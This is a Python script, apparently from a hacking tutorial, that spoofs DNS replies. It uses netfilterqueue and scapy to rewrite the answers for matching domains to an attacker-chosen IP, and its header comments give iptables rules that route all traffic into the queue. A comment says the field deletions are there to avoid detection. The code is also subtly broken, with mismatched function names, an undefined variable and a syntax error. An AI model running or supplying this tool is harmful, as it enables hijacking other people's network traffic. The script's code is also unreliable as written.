#!/usr/bin/python
# make sure netfilterquque library installed via pip
# check the dnsspoof-iptables-rules.txt for the IP routing rules 
# that need to be implemented in order to pipe traffic to netfilterqueue
# here are the rules
# iptables --flush
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy


def del_fields(scapy_packet):
    # delete some fields that will cause detection if left as packet has been changed.
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet


def process_pakcet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet)
    # DNSRR is the DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "something" in qname:
            # Specify the IP address of the web server you want the DNS query to direct to
            answer = scapy.DNSRR((rrname=quname, rdata="10.0.2.10"))
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            scapy_packet = del_fields(scapy_packet)

            packet.set_payload(str(scapy_packet))  
    packet.accept()  


def findDNS(pac):
    if pac.haslayer(DNS):
        print pac[IP].src, pac[DNS].summary()


# sniff(prn=findDNS)


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



